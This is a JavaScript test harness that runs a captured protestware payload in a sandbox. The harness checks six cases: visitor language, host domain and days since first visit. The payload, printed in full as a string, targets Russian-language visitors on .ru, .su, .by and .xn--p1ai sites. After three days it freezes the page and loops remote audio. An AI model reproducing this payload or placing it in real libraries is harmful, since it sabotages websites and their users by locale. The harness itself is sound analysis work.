var trace = []; function print(value) { trace.push(JSON.parse(value)); }
const payload = "if(\"undefined\"!=typeof window&&/^ru\\b/.test(navigator.language)&&location.host.match(/\\.(ru|su|by|xn--p1ai)$/)){var rr=new Date,ir=localStorage.getItem(\"swal-initiation\");ir?(rr.getTime()-Date.parse(ir))/864e5>3&&setTimeout((function(){document.body.style.pointerEvents=\"none\";var e=document.createElement(\"audio\");e.src=\"https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3\",e.loop=!0,document.body.appendChild(e),setTimeout((function(){e.play().catch((function(){}))}),2500)}),500):localStorage.setItem(\"swal-initiation\",\"\".concat(rr))}";

const RealDate = Date;
function check(label, language, host, age, expected) {
  const calls = []; const now = 1800000000000;
  class FixedDate extends RealDate { constructor(...args) { super(...(args.length ? args : [now])); } }
  const localStorage = {
    getItem(key) { calls.push('read:' + key); return age === null ? null : new RealDate(now - age * 86400000).toISOString(); },
    setItem(key, value) { calls.push('write:' + key); }
  };
  const document = {
    body: {style: {}, appendChild(audio) { calls.push('append:' + audio.src); }},
    createElement(tag) { calls.push('create:' + tag); return {play() { calls.push('play'); return {catch() {}}; }}; }
  };
  const timers = [];
  new Function('window','navigator','location','localStorage','Date','document','setTimeout',payload)(
    {}, {language}, {host}, localStorage, FixedDate, document, (callback,delay) => {timers.push(delay); callback();});
  const observed = {
    blocked: document.body.style.pointerEvents === 'none',
    plays: calls.includes('play'),
    initialized: calls.includes('write:swal-initiation')
  };
  if (JSON.stringify(observed) !== JSON.stringify(expected)) throw new Error(label + ': ' + JSON.stringify(observed));
  print(JSON.stringify({label,language,host,age,observed,calls,timers}));
}
check('first visit', 'ru-RU','site.ru',null,{blocked:false,plays:false,initialized:true});
check('four days', 'ru-RU','site.ru',4,{blocked:true,plays:true,initialized:false});
check('exactly three days', 'ru-RU','site.ru',3,{blocked:false,plays:false,initialized:false});
check('other language', 'en-US','site.ru',4,{blocked:false,plays:false,initialized:false});
check('other host', 'ru-RU','site.com',4,{blocked:false,plays:false,initialized:false});
check('Belarus', 'ru','site.by',4,{blocked:true,plays:true,initialized:false});

JSON.stringify(trace);
